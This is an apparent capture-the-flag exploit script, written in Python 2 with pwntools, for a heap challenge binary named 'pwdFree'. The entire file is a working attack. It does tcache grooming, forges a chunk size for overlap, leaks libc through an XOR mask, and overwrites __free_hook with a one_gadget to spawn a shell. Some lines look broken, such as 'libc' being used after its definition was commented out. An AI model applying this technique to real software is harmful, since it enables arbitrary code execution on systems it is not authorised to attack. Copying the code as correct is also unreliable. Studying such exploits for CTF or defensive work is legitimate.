from pwn import *
context.log_level = 'debug'
#context.terminal = ['tmux','sp','-h']


# def command(index):
#     p.sendlineafter("Choice:\n",str(index))

def add(id,size,content):
    p.sendlineafter("Input Your Choice:\n",str(1))
    p.sendafter("Save:",str(id))
    p.sendlineafter("Pwd:",str(size))
    p.sendafter("Pwd:",content)
def show(id):
    p.sendlineafter("Choice:\n",str(3))
    p.sendlineafter("Check:\n",str(id))
def delete(id):
    p.sendlineafter("Choice:\n",str(4))
    p.sendlineafter("Delete:\n",str(id))
def edit(id,data):
    p.sendlineafter("Choice:\n",str(2))
    p.sendline(str(id))
    p.sendline(str(data))

p = process("./pwdFree")
p=process('./pwdFree',env={'LD_PRELOAD':'./libc.so.6'})
# p=remote('47.104.71.220',38562)
# libc = ELF("libc.so.6")



add(0,0xf8,'\n')
p.recvuntil('D:')
leak=u64(p.recv(8))
rand=leak^0xa
add(1,0xf8,'\n')
add(2,0xf8,'\n')


for i in range(7):
	add(i+3,0xf0,'\n')
for i in range(6):
	delete(i+3)

delete(1)
delete(0)
num=0x200^rand
payload='c'*0xf0+p64(num)
add(0,0xf8,payload)
delete(9)
delete(2)

add(1,0xf8,'\n')
add(2,0xf8,'\n')
add(3,0xf8,'\n')
add(4,0xf8,'\n')
add(5,0xf8,'\n')
add(6,0xf8,'\n')
add(7,0xf8,'\n')
add(8,0xf8,'\n')

show(0)
p.recvuntil('Pwd is: ')
leak=u64(p.recv(8))
l=leak^rand
print hex(l)

libcbase=l-(0x7ffff7dcdca0-0x00007ffff79e2000)
add(9,0xf8,'\n')

delete(1)
delete(2)
delete(0)
free=libcbase+libc.sym['__free_hook']
edit(9,p64(free))


raw_input()

add(1,0xf8,'\n')

one=libcbase+0x4f432
system=libcbase+libc.sym['system']
system=one^rand
payload=p64(system)
add(2,0xf8,payload+'\n')
print hex(libcbase)


#gdb.attach(p,"b *0x555555555680")
#0x555555558060


# p.recvuntil("Save ID:")

delete(1)



p.interactive()
